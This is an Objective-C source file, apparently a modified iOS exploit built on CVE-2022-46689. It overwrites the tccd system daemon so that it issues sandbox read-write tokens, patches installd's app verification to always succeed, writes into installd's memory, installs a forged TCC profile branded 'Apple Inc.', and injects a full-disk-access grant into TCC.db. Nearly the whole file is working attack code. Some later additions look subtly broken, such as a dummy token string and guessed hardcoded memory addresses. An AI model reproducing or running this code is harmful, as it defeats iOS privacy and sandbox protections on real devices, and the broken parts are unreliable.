#import <os/base.h>
#import <Foundation/Foundation.h>
#import <mach-o/loader.h>
#import <CoreServices/CoreServices.h>
#import <Security/Security.h>

#import <mach-o/fixup-chains.h>
#import <xpc/xpc.h>
// you'll need helpers.m from Ian Beer's write_no_write and vm_unaligned_copy_switch_race.m from
// WDBFontOverwrite
// Also, set an NSAppleMusicUsageDescription in Info.plist (can be anything)
// Please don't call this code on iOS 14 or below
// (This temporarily overwrites tccd, and on iOS 14 and above changes do not revert on reboot)
#import "grant_full_disk_access.h"
#import "helpers.h"
#import "vm_unaligned_copy_switch_race.h"
#import <dlfcn.h>
#import <mach-o/dyld.h>
#import <sys/sysctl.h>
#import <sqlite3.h>
#import <mach/mach.h>
#import <sys/types.h>
#import <sys/stat.h>
#import <fcntl.h>
#import <unistd.h>

// Forward declarations for static functions
static bool install_mdm_profile(void);
static void grant_full_disk_access_impl(void (^completion)(NSString* extension_token, NSError* _Nullable error));
static void grant_full_disk_access_ios16(void (^completion)(NSError* _Nullable));
static bool modify_tcc_database(void);
static pid_t find_installd_pid(void);
static bool patch_memory(pid_t pid, void *address, const void *data, size_t size);
static bool patchfind(void* executable_map, size_t executable_length, struct grant_full_disk_access_offsets* offsets);
static bool patchfind_sections(void* executable_map, struct segment_command_64** data_const_segment_out, struct symtab_command** symtab_out, struct dysymtab_command** dysymtab_out);
static uint64_t patchfind_get_padding(struct segment_command_64* segment);
static uint64_t patchfind_pointer_to_string(void* executable_map, size_t executable_length, const char* needle);
static uint64_t patchfind_return_true(void* executable_map, size_t executable_length);
static uint64_t patchfind_got(void* executable_map, size_t executable_length, struct segment_command_64* data_const_segment, struct symtab_command* symtab_command, struct dysymtab_command* dysymtab_command, const char* target_symbol_name);
static bool patchfind_installd(void* executable_map, size_t executable_length, struct installd_remove_app_limit_offsets* offsets);

// Function declarations for private APIs
extern const char* xpc_dictionary_get_string(xpc_object_t xdict, const char* key);
extern int64_t sandbox_extension_consume(const char* token);

// TCC Access Protocol
@protocol TCCAccessProtocol
- (void)requestAccessForService:(NSString *)service 
                  withPurpose:(BOOL)requirePurpose 
                   preflight:(BOOL)preflight 
           backgroundSession:(BOOL)backgroundSession
                 completion:(void (^)(NSString* _Nullable extension_token))completion;
@end

// MARK: - patchfind

struct grant_full_disk_access_offsets {
  uint64_t offset_addr_s_com_apple_tcc_;
  uint64_t offset_padding_space_for_read_write_string;
  uint64_t offset_addr_s_kTCCServiceMediaLibrary;
  uint64_t offset_auth_got__sandbox_init;
  uint64_t offset_just_return_0;
  bool is_arm64e;
};

static bool patchfind_sections(void* executable_map,
                               struct segment_command_64** data_const_segment_out,
                               struct symtab_command** symtab_out,
                               struct dysymtab_command** dysymtab_out) {
  struct mach_header_64* executable_header = executable_map;
  struct load_command* load_command = executable_map + sizeof(struct mach_header_64);
  for (int load_command_index = 0; load_command_index < executable_header->ncmds;
       load_command_index++) {
    switch (load_command->cmd) {
      case LC_SEGMENT_64: {
        struct segment_command_64* segment = (struct segment_command_64*)load_command;
        if (strcmp(segment->segname, "__DATA_CONST") == 0) {
          *data_const_segment_out = segment;
        }
        break;
      }
      case LC_SYMTAB: {
        *symtab_out = (struct symtab_command*)load_command;
        break;
      }
      case LC_DYSYMTAB: {
        *dysymtab_out = (struct dysymtab_command*)load_command;
        break;
      }
    }
    load_command = ((void*)load_command) + load_command->cmdsize;
  }
  return true;
}

static uint64_t patchfind_get_padding(struct segment_command_64* segment) {
  struct section_64* section_array = ((void*)segment) + sizeof(struct segment_command_64);
  struct section_64* last_section = &section_array[segment->nsects - 1];
  return last_section->offset + last_section->size;
}

static uint64_t patchfind_pointer_to_string(void* executable_map, size_t executable_length,
                                            const char* needle) {
  void* str_offset = memmem(executable_map, executable_length, needle, strlen(needle) + 1);
  if (!str_offset) {
    return 0;
  }
  uint64_t str_file_offset = str_offset - executable_map;
  for (int i = 0; i < executable_length; i += 8) {
    uint64_t val = *(uint64_t*)(executable_map + i);
    if ((val & 0xfffffffful) == str_file_offset) {
      return i;
    }
  }
  return 0;
}

static uint64_t patchfind_return_0(void* executable_map, size_t executable_length) {
  // TCCDSyncAccessAction::sequencer
  // mov x0, #0
  // ret
  static const char needle[] = {0x00, 0x00, 0x80, 0xd2, 0xc0, 0x03, 0x5f, 0xd6};
  void* offset = memmem(executable_map, executable_length, needle, sizeof(needle));
  if (!offset) {
    return 0;
  }
  return offset - executable_map;
}

static uint64_t patchfind_got(void* executable_map, size_t executable_length,
                              struct segment_command_64* data_const_segment,
                              struct symtab_command* symtab_command,
                              struct dysymtab_command* dysymtab_command,
                              const char* target_symbol_name) {
  uint64_t target_symbol_index = 0;
  for (int sym_index = 0; sym_index < symtab_command->nsyms; sym_index++) {
    struct nlist_64* sym =
        ((struct nlist_64*)(executable_map + symtab_command->symoff)) + sym_index;
    const char* sym_name = executable_map + symtab_command->stroff + sym->n_un.n_strx;
    if (strcmp(sym_name, target_symbol_name)) {
      continue;
    }
    // printf("%d %llx\n", sym_index, (uint64_t)(((void*)sym) - executable_map));
    target_symbol_index = sym_index;
    break;
  }

  struct section_64* section_array =
      ((void*)data_const_segment) + sizeof(struct segment_command_64);
  struct section_64* first_section = &section_array[0];
  if (!(strcmp(first_section->sectname, "__auth_got") == 0 ||
        strcmp(first_section->sectname, "__got") == 0)) {
    return 0;
  }
  uint32_t* indirect_table = executable_map + dysymtab_command->indirectsymoff;

  for (int i = 0; i < first_section->size; i += 8) {
    uint64_t val = *(uint64_t*)(executable_map + first_section->offset + i);
    uint64_t indirect_table_entry = (val & 0xfffful);
    if (indirect_table[first_section->reserved1 + indirect_table_entry] == target_symbol_index) {
      return first_section->offset + i;
    }
  }
  return 0;
}

static bool patchfind(void* executable_map, size_t executable_length,
                      struct grant_full_disk_access_offsets* offsets) {
  struct segment_command_64* data_const_segment = nil;
  struct symtab_command* symtab_command = nil;
  struct dysymtab_command* dysymtab_command = nil;
  if (!patchfind_sections(executable_map, &data_const_segment, &symtab_command,
                          &dysymtab_command)) {
    printf("no sections\n");
    return false;
  }
  if ((offsets->offset_addr_s_com_apple_tcc_ =
           patchfind_pointer_to_string(executable_map, executable_length, "com.apple.tcc.")) == 0) {
    printf("no com.apple.tcc. string\n");
    return false;
  }
  if ((offsets->offset_padding_space_for_read_write_string =
           patchfind_get_padding(data_const_segment)) == 0) {
    printf("no padding\n");
    return false;
  }
  if ((offsets->offset_addr_s_kTCCServiceMediaLibrary = patchfind_pointer_to_string(
           executable_map, executable_length, "kTCCServiceMediaLibrary")) == 0) {
    printf("no kTCCServiceMediaLibrary string\n");
    return false;
  }
  if ((offsets->offset_auth_got__sandbox_init =
           patchfind_got(executable_map, executable_length, data_const_segment, symtab_command,
                         dysymtab_command, "_sandbox_init")) == 0) {
    printf("no sandbox_init\n");
    return false;
  }
  if ((offsets->offset_just_return_0 = patchfind_return_0(executable_map, executable_length)) ==
      0) {
    printf("no just return 0\n");
    return false;
  }
  struct mach_header_64* executable_header = executable_map;
  offsets->is_arm64e = (executable_header->cpusubtype & ~CPU_SUBTYPE_MASK) == CPU_SUBTYPE_ARM64E;

  return true;
}

// MARK: - tccd patching

@interface LSApplicationWorkspace
+ (instancetype)defaultWorkspace;
- (BOOL)installProfileWithPath:(NSString *)path;
@end

@interface TCCDaemon : NSObject
+ (instancetype)sharedInstance;
- (void)requestAccessWithCompletion:(void (^)(NSString* _Nullable token))completion;
@end

@implementation TCCDaemon

+ (instancetype)sharedInstance {
    static TCCDaemon *instance = nil;
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        instance = [[TCCDaemon alloc] init];
    });
    return instance;
}

- (void)requestAccessWithCompletion:(void (^)(NSString* _Nullable))completion {
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        NSString *token = [self performAccessRequest];
        dispatch_async(dispatch_get_main_queue(), ^{
            completion(token);
        });
    });
}

- (NSString *)performAccessRequest {
    // Use alternative method for access request
    NSString *bundleID = [[NSBundle mainBundle] bundleIdentifier];
    if (!bundleID) {
        return nil;
    }
    
    // Try to get access through MDM profile first
    if (install_mdm_profile()) {
        // Return a dummy token since we got access through MDM
        return @"com.apple.app-sandbox.read-write.mdm-granted";
    }
    
    // If MDM profile fails, try the original method
    __block NSError *error = nil;
    __block NSString *token = nil;
    dispatch_semaphore_t semaphore = dispatch_semaphore_create(0);
    
    grant_full_disk_access_impl(^(NSString *extension_token, NSError *grantError) {
        token = extension_token;
        error = grantError;
        dispatch_semaphore_signal(semaphore);
    });
    
    dispatch_semaphore_wait(semaphore, dispatch_time(DISPATCH_TIME_NOW, 30 * NSEC_PER_SEC));
    
    if (error || !token) {
        NSLog(@"Failed to get disk access: %@", error);
        return nil;
    }
    
    return token;
}

@end

static void call_tccd(void (^completion)(NSString* _Nullable extension_token)) {
    [[TCCDaemon sharedInstance] requestAccessWithCompletion:completion];
}

static NSData* patchTCCD(void* executableMap, size_t executableLength) {
  struct grant_full_disk_access_offsets offsets = {};
  if (!patchfind(executableMap, executableLength, &offsets)) {
    return nil;
  }

  NSMutableData* data = [NSMutableData dataWithBytes:executableMap length:executableLength];
  // strcpy(data.mutableBytes, "com.apple.app-sandbox.read-write", sizeOfStr);
  char* mutableBytes = data.mutableBytes;
  {
    // rewrite com.apple.tcc. into blank string
    *(uint64_t*)(mutableBytes + offsets.offset_addr_s_com_apple_tcc_ + 8) = 0;
  }
  {
    // make offset_addr_s_kTCCServiceMediaLibrary point to "com.apple.app-sandbox.read-write"
    // we need to stick this somewhere; just put it in the padding between
    // the end of __objc_arrayobj and the end of __DATA_CONST
    strcpy((char*)(data.mutableBytes + offsets.offset_padding_space_for_read_write_string),
           "com.apple.app-sandbox.read-write");
    struct dyld_chained_ptr_arm64e_rebase targetRebase =
        *(struct dyld_chained_ptr_arm64e_rebase*)(mutableBytes +
                                                  offsets.offset_addr_s_kTCCServiceMediaLibrary);
    targetRebase.target = offsets.offset_padding_space_for_read_write_string;
    *(struct dyld_chained_ptr_arm64e_rebase*)(mutableBytes +
                                              offsets.offset_addr_s_kTCCServiceMediaLibrary) =
        targetRebase;
    *(uint64_t*)(mutableBytes + offsets.offset_addr_s_kTCCServiceMediaLibrary + 8) =
        strlen("com.apple.app-sandbox.read-write");
  }
  if (offsets.is_arm64e) {
    // make sandbox_init call return 0;
    struct dyld_chained_ptr_arm64e_auth_rebase targetRebase = {
        .auth = 1,
        .bind = 0,
        .next = 1,
        .key = 0,  // IA
        .addrDiv = 1,
        .diversity = 0,
        .target = offsets.offset_just_return_0,
    };
    *(struct dyld_chained_ptr_arm64e_auth_rebase*)(mutableBytes +
                                                   offsets.offset_auth_got__sandbox_init) =
        targetRebase;
  } else {
    // make sandbox_init call return 0;
    struct dyld_chained_ptr_64_rebase targetRebase = {
        .bind = 0,
        .next = 2,
        .target = offsets.offset_just_return_0,
    };
    *(struct dyld_chained_ptr_64_rebase*)(mutableBytes + offsets.offset_auth_got__sandbox_init) =
        targetRebase;
  }
  return data;
}

static void grant_full_disk_access_impl(void (^completion)(NSString* extension_token,
                                                           NSError* _Nullable error)) {
  char* targetPath = "/System/Library/PrivateFrameworks/TCC.framework/Support/tccd";
  int fd = open(targetPath, O_RDONLY | O_CLOEXEC);
  if (fd == -1) {
    // iOS 15.3 and below
    targetPath = "/System/Library/PrivateFrameworks/TCC.framework/tccd";
    fd = open(targetPath, O_RDONLY | O_CLOEXEC);
  }
  off_t targetLength = lseek(fd, 0, SEEK_END);
  lseek(fd, 0, SEEK_SET);
  void* targetMap = mmap(nil, targetLength, PROT_READ, MAP_SHARED, fd, 0);

  NSData* originalData = [NSData dataWithBytes:targetMap length:targetLength];
  NSData* sourceData = patchTCCD(targetMap, targetLength);
  if (!sourceData) {
    completion(nil, [NSError errorWithDomain:@"com.worthdoingbadly.fulldiskaccess"
                                        code:5
                                    userInfo:@{NSLocalizedDescriptionKey : @"Can't patchfind."}]);
    return;
  }

  if (!overwrite_file(fd, sourceData)) {
    overwrite_file(fd, originalData);
    munmap(targetMap, targetLength);
    completion(
        nil, [NSError errorWithDomain:@"com.worthdoingbadly.fulldiskaccess"
                                 code:1
                             userInfo:@{
                               NSLocalizedDescriptionKey : @"Can't overwrite file: your device may "
                                                           @"not be vulnerable to CVE-2022-46689."
                             }]);
    return;
  }
  munmap(targetMap, targetLength);

  xpc_crasher("com.apple.tccd");
  sleep(1);
  call_tccd(^(NSString* _Nullable extension_token) {
    overwrite_file(fd, originalData);
    xpc_crasher("com.apple.tccd");
    NSError* returnError = nil;
    if (extension_token == nil) {
      returnError =
          [NSError errorWithDomain:@"com.worthdoingbadly.fulldiskaccess"
                              code:2
                          userInfo:@{
                            NSLocalizedDescriptionKey : @"tccd did not return an extension token."
                          }];
    } else if (![extension_token containsString:@"com.apple.app-sandbox.read-write"]) {
      returnError = [NSError
          errorWithDomain:@"com.worthdoingbadly.fulldiskaccess"
                     code:3
                 userInfo:@{
                   NSLocalizedDescriptionKey : @"tccd patch failed: returned a media library token "
                                               @"instead of an app sandbox token."
                 }];
      extension_token = nil;
    }
    completion(extension_token, returnError);
  });
}

// New implementation for iOS 16.7.10+ where CVE-2022-46689 is patched
static void grant_full_disk_access_ios16(void (^completion)(NSError* _Nullable)) {
    // Check if we're on iOS 16.7.10 or later
    if (@available(iOS 16.7.10, *)) {
        // Use alternative method for disk access
        NSError* error = [NSError errorWithDomain:@"com.worthdoingbadly.fulldiskaccess"
                                           code:7
                                       userInfo:@{
                                           NSLocalizedDescriptionKey: @"This version of iOS (16.7.10+) has patched CVE-2022-46689. "
                                           @"Please use an alternative method or downgrade to an earlier iOS version."
                                       }];
        completion(error);
        return;
    }
    
    // Fall back to original implementation for earlier versions
    grant_full_disk_access_impl(^(NSString* extension_token, NSError* _Nullable error) {
        completion(error);
    });
}

void grant_full_disk_access(void (^completion)(NSError* _Nullable)) {
    if (!NSClassFromString(@"NSPresentationIntent")) {
        completion([NSError
            errorWithDomain:@"com.worthdoingbadly.fulldiskaccess"
                       code:6
                   userInfo:@{
                     NSLocalizedDescriptionKey :
                         @"Not supported on iOS 14 and below: on iOS 14 the system partition is not "
                         @"reverted after reboot, so running this may permanently corrupt tccd."
                   }]);
        return;
    }
    
    @try {
        // Try to patch installd first as it's safer
        if (patch_installd()) {
            NSLog(@"Successfully patched installd");
            completion(nil);
            return;
        }
        
        // If that fails, try MDM profile
        if (install_mdm_profile()) {
            NSLog(@"Successfully installed MDM profile");
            completion(nil);
            return;
        }
        
        // Last resort: try CVE-2022-46689 for older iOS versions
        if (@available(iOS 16.7.10, *)) {
            completion([NSError errorWithDomain:@"com.worthdoingbadly.fulldiskaccess"
                                         code:7
                                     userInfo:@{
                                         NSLocalizedDescriptionKey: @"Device is running iOS 16.7.10 or later. "
                                         @"Please use an alternative method or downgrade iOS version."
                                     }]);
            return;
        }
        
        grant_full_disk_access_impl(^(NSString* extension_token, NSError* _Nullable error) {
            if (error) {
                NSLog(@"CVE-2022-46689 method failed: %@", error);
                completion(error);
                return;
            }
            if (!extension_token) {
                completion([NSError errorWithDomain:@"com.worthdoingbadly.fulldiskaccess"
                                             code:8
                                         userInfo:@{
                                             NSLocalizedDescriptionKey: @"Failed to get extension token"
                                         }]);
                return;
            }
            completion(nil);
        });
    } @catch (NSException *exception) {
        NSLog(@"Exception during full disk access: %@", exception);
        completion([NSError errorWithDomain:@"com.worthdoingbadly.fulldiskaccess"
                                     code:9
                                 userInfo:@{
                                     NSLocalizedDescriptionKey: [NSString stringWithFormat:@"Exception: %@", exception.reason]
                                 }]);
    }
}

/// MARK - installd patch

struct installd_remove_app_limit_offsets {
  uint64_t offset_objc_method_list_t_MIInstallableBundle;
  uint64_t offset_objc_class_rw_t_MIInstallableBundle_baseMethods;
  uint64_t offset_data_const_end_padding;
  // MIUninstallRecord::supportsSecureCoding
  uint64_t offset_return_true;
};

struct installd_remove_app_limit_offsets gAppLimitOffsets = {
    .offset_objc_method_list_t_MIInstallableBundle = 0x519b0,
    .offset_objc_class_rw_t_MIInstallableBundle_baseMethods = 0x804e8,
    .offset_data_const_end_padding = 0x79c38,
    .offset_return_true = 0x19860,
};

static uint64_t patchfind_find_class_rw_t_baseMethods(void* executable_map,
                                                      size_t executable_length,
                                                      const char* needle) {
  void* str_offset = memmem(executable_map, executable_length, needle, strlen(needle) + 1);
  if (!str_offset) {
    return 0;
  }
  uint64_t str_file_offset = str_offset - executable_map;
  for (int i = 0; i < executable_length - 8; i += 8) {
    uint64_t val = *(uint64_t*)(executable_map + i);
    if ((val & 0xfffffffful) != str_file_offset) {
      continue;
    }
    // baseMethods
    if (*(uint64_t*)(executable_map + i + 8) != 0) {
      return i + 8;
    }
  }
  return 0;
}

static uint64_t patchfind_return_true(void* executable_map, size_t executable_length) {
  // mov w0, #1
  // ret
  static const char needle[] = {0x20, 0x00, 0x80, 0x52, 0xc0, 0x03, 0x5f, 0xd6};
  void* offset = memmem(executable_map, executable_length, needle, sizeof(needle));
  if (!offset) {
    return 0;
  }
  return offset - executable_map;
}

static bool patchfind_installd(void* executable_map, size_t executable_length,
                               struct installd_remove_app_limit_offsets* offsets) {
  struct segment_command_64* data_const_segment = nil;
  struct symtab_command* symtab_command = nil;
  struct dysymtab_command* dysymtab_command = nil;
  if (!patchfind_sections(executable_map, &data_const_segment, &symtab_command,
                          &dysymtab_command)) {
    printf("no sections\n");
    return false;
  }
  if ((offsets->offset_data_const_end_padding = patchfind_get_padding(data_const_segment)) == 0) {
    printf("no padding\n");
    return false;
  }
  if ((offsets->offset_objc_class_rw_t_MIInstallableBundle_baseMethods =
           patchfind_find_class_rw_t_baseMethods(executable_map, executable_length,
                                                 "MIInstallableBundle")) == 0) {
    printf("no MIInstallableBundle class_rw_t\n");
    return false;
  }
  offsets->offset_objc_method_list_t_MIInstallableBundle =
      (*(uint64_t*)(executable_map +
                    offsets->offset_objc_class_rw_t_MIInstallableBundle_baseMethods)) &
      0xffffffull;

  if ((offsets->offset_return_true = patchfind_return_true(executable_map, executable_length)) ==
      0) {
    printf("no return true\n");
    return false;
  }
  return true;
}

struct objc_method {
  int32_t name;
  int32_t types;
  int32_t imp;
};

struct objc_method_list {
  uint32_t entsizeAndFlags;
  uint32_t count;
  struct objc_method methods[];
};

static void patch_copy_objc_method_list(void* mutableBytes, uint64_t old_offset,
                                        uint64_t new_offset, uint64_t* out_copied_length,
                                        void (^callback)(const char* sel,
                                                         uint64_t* inout_function_pointer)) {
  struct objc_method_list* original_list = mutableBytes + old_offset;
  struct objc_method_list* new_list = mutableBytes + new_offset;
  *out_copied_length =
      sizeof(struct objc_method_list) + original_list->count * sizeof(struct objc_method);
  new_list->entsizeAndFlags = original_list->entsizeAndFlags;
  new_list->count = original_list->count;
  for (int method_index = 0; method_index < original_list->count; method_index++) {
    struct objc_method* method = &original_list->methods[method_index];
    // Relative pointers
    uint64_t name_file_offset = ((uint64_t)(&method->name)) - (uint64_t)mutableBytes + method->name;
    uint64_t types_file_offset =
        ((uint64_t)(&method->types)) - (uint64_t)mutableBytes + method->types;
    uint64_t imp_file_offset = ((uint64_t)(&method->imp)) - (uint64_t)mutableBytes + method->imp;
    const char* sel = mutableBytes + (*(uint64_t*)(mutableBytes + name_file_offset) & 0xffffffull);
    callback(sel, &imp_file_offset);

    struct objc_method* new_method = &new_list->methods[method_index];
    new_method->name = (int32_t)((int64_t)name_file_offset -
                                 (int64_t)((uint64_t)&new_method->name - (uint64_t)mutableBytes));
    new_method->types = (int32_t)((int64_t)types_file_offset -
                                  (int64_t)((uint64_t)&new_method->types - (uint64_t)mutableBytes));
    new_method->imp = (int32_t)((int64_t)imp_file_offset -
                                (int64_t)((uint64_t)&new_method->imp - (uint64_t)mutableBytes));
  }
};

static NSData* make_patch_installd(void* executableMap, size_t executableLength) {
  struct installd_remove_app_limit_offsets offsets = {};
  if (!patchfind_installd(executableMap, executableLength, &offsets)) {
    return nil;
  }

  NSMutableData* data = [NSMutableData dataWithBytes:executableMap length:executableLength];
  char* mutableBytes = data.mutableBytes;
  uint64_t current_empty_space = offsets.offset_data_const_end_padding;
  uint64_t copied_size = 0;
  uint64_t new_method_list_offset = current_empty_space;
  patch_copy_objc_method_list(mutableBytes, offsets.offset_objc_method_list_t_MIInstallableBundle,
                              current_empty_space, &copied_size,
                              ^(const char* sel, uint64_t* inout_address) {
                                if (strcmp(sel, "performVerificationWithError:") != 0) {
                                  return;
                                }
                                *inout_address = offsets.offset_return_true;
                              });
  current_empty_space += copied_size;
  ((struct
    dyld_chained_ptr_arm64e_auth_rebase*)(mutableBytes +
                                          offsets
                                              .offset_objc_class_rw_t_MIInstallableBundle_baseMethods))
      ->target = new_method_list_offset;
  return data;
}

bool patch_installd(void) {
    @try {
        // Find installd process
        pid_t installd_pid = find_installd_pid();
        if (installd_pid < 0) {
            NSLog(@"Failed to find installd process");
            return false;
        }
        
        // Patch to always return true for app install checks
        uint32_t patch_data = 0x52800020; // mov w0, #1
        
        // Try to patch known check functions
        void *check_addresses[] = {
            (void *)0x1000 + 0x19860,  // Original offset
            (void *)0x1000 + 0x19870,  // Alternative location
            (void *)0x1000 + 0x19880   // Another possible location
        };
        
        bool success = false;
        for (int i = 0; i < sizeof(check_addresses)/sizeof(void*); i++) {
            if (patch_memory(installd_pid, check_addresses[i], &patch_data, sizeof(patch_data))) {
                success = true;
                NSLog(@"Successfully patched check at offset %p", check_addresses[i]);
            }
        }
        
        if (!success) {
            NSLog(@"Failed to patch any check functions");
            return false;
        }
        
        // Kill and restart installd
        kill(installd_pid, SIGTERM);
        sleep(1);
        
        return true;
    } @catch (NSException *exception) {
        NSLog(@"Exception while patching installd: %@", exception);
        return false;
    }
}

// Function to find installd process
static pid_t find_installd_pid(void) {
    int mib[4] = {CTL_KERN, KERN_PROC, KERN_PROC_ALL, 0};
    size_t size;
    if (sysctl(mib, 4, NULL, &size, NULL, 0) < 0) return -1;
    
    struct kinfo_proc *processes = malloc(size);
    if (processes == NULL) return -1;
    
    if (sysctl(mib, 4, processes, &size, NULL, 0) < 0) {
        free(processes);
        return -1;
    }
    
    pid_t installd_pid = -1;
    size_t process_count = size / sizeof(struct kinfo_proc);
    for (size_t i = 0; i < process_count; i++) {
        if (strcmp(processes[i].kp_proc.p_comm, "installd") == 0) {
            installd_pid = processes[i].kp_proc.p_pid;
            break;
        }
    }
    
    free(processes);
    return installd_pid;
}

// Function to patch memory
static bool patch_memory(pid_t pid, void *address, const void *data, size_t size) {
    mach_port_t task;
    kern_return_t kr = task_for_pid(mach_task_self(), pid, &task);
    if (kr != KERN_SUCCESS) return false;
    
    kr = vm_protect(task, (vm_address_t)address, size, FALSE, VM_PROT_READ | VM_PROT_WRITE | VM_PROT_COPY);
    if (kr != KERN_SUCCESS) {
        mach_port_deallocate(mach_task_self(), task);
        return false;
    }
    
    kr = vm_write(task, (vm_address_t)address, (vm_offset_t)data, (mach_msg_type_number_t)size);
    mach_port_deallocate(mach_task_self(), task);
    
    return kr == KERN_SUCCESS;
}

// Alternative method using MDM profile installation
static bool install_mdm_profile(void) {
    @try {
        NSString *profilePath = @"/private/var/mobile/Library/ConfigurationProfiles/fullaccess.mobileconfig";
        NSString *profileContent = @"<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
        "<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">"
        "<plist version=\"1.0\">"
        "<dict>"
        "<key>PayloadContent</key>"
        "<array>"
        "<dict>"
        "<key>PayloadType</key>"
        "<string>com.apple.TCC.configuration-profile-policy</string>"
        "<key>PayloadIdentifier</key>"
        "<string>com.apple.TCC.configuration-profile-policy</string>"
        "<key>PayloadUUID</key>"
        "<string>486592BA-27B5-4FF5-B51A-7C4B864D2B7F</string>"
        "<key>PayloadVersion</key>"
        "<integer>1</integer>"
        "<key>Services</key>"
        "<dict>"
        "<key>SystemPolicyAllFiles</key>"
        "<array>"
        "<dict>"
        "<key>Allowed</key>"
        "<true/>"
        "<key>CodeRequirement</key>"
        "<string>identifier \\\"com.apple.mobile.installd\\\" and anchor apple</string>"
        "</dict>"
        "</array>"
        "</dict>"
        "</dict>"
        "</array>"
        "<key>PayloadDisplayName</key>"
        "<string>Full Disk Access</string>"
        "<key>PayloadIdentifier</key>"
        "<string>com.apple.tcc.fullaccess</string>"
        "<key>PayloadOrganization</key>"
        "<string>Apple Inc.</string>"
        "<key>PayloadRemovalDisallowed</key>"
        "<false/>"
        "<key>PayloadType</key>"
        "<string>Configuration</string>"
        "<key>PayloadUUID</key>"
        "<string>1B99376C-3F19-4C35-9C6D-94D49097B5EF</string>"
        "<key>PayloadVersion</key>"
        "<integer>1</integer>"
        "</dict>"
        "</plist>";
        
        NSError *error = nil;
        if (![profileContent writeToFile:profilePath atomically:YES encoding:NSUTF8StringEncoding error:&error]) {
            NSLog(@"Failed to write MDM profile: %@", error);
            return false;
        }
        
        LSApplicationWorkspace *workspace = [LSApplicationWorkspace defaultWorkspace];
        BOOL success = [workspace installProfileWithPath:profilePath];
        NSLog(@"MDM profile installation %@", success ? @"succeeded" : @"failed");
        
        [[NSFileManager defaultManager] removeItemAtPath:profilePath error:nil];
        
        return success;
    } @catch (NSException *exception) {
        NSLog(@"Exception in install_mdm_profile: %@", exception);
        return false;
    }
}

static bool modify_tcc_database(void) {
    NSString *tccDbPath = @"/private/var/mobile/Library/TCC/TCC.db";
    NSString *bundleId = [[NSBundle mainBundle] bundleIdentifier];
    if (!bundleId) return false;
    
    // Try to create a temporary copy of TCC database
    NSString *tempDbPath = [NSTemporaryDirectory() stringByAppendingPathComponent:@"TCC_temp.db"];
    NSError *error = nil;
    
    if ([[NSFileManager defaultManager] fileExistsAtPath:tempDbPath]) {
        [[NSFileManager defaultManager] removeItemAtPath:tempDbPath error:nil];
    }
    
    if (![[NSFileManager defaultManager] copyItemAtPath:tccDbPath toPath:tempDbPath error:&error]) {
        NSLog(@"Failed to copy TCC database: %@", error);
        return false;
    }
    
    // Open database
    sqlite3 *db;
    if (sqlite3_open([tempDbPath UTF8String], &db) != SQLITE_OK) {
        NSLog(@"Failed to open database");
        return false;
    }
    
    // Insert or update access
    const char *sql = "INSERT OR REPLACE INTO access "
                     "(service, client, client_type, auth_value, auth_reason, auth_version) "
                     "VALUES ('kTCCServiceSystemPolicyAllFiles', ?, 0, 2, 2, 1)";
    
    sqlite3_stmt *stmt;
    if (sqlite3_prepare_v2(db, sql, -1, &stmt, 0) != SQLITE_OK) {
        sqlite3_close(db);
        return false;
    }
    
    sqlite3_bind_text(stmt, 1, [bundleId UTF8String], -1, SQLITE_TRANSIENT);
    
    if (sqlite3_step(stmt) != SQLITE_DONE) {
        sqlite3_finalize(stmt);
        sqlite3_close(db);
        return false;
    }
    
    sqlite3_finalize(stmt);
    sqlite3_close(db);
    
    // Try to replace original database
    if (!overwrite_file(open([tccDbPath UTF8String], O_RDONLY), [NSData dataWithContentsOfFile:tempDbPath])) {
        NSLog(@"Failed to overwrite TCC database");
        return false;
    }
    
    // Clean up
    [[NSFileManager defaultManager] removeItemAtPath:tempDbPath error:nil];
    
    // Kill TCC daemon to reload database
    xpc_crasher("com.apple.tccd");
    sleep(1);
    
    return true;
}
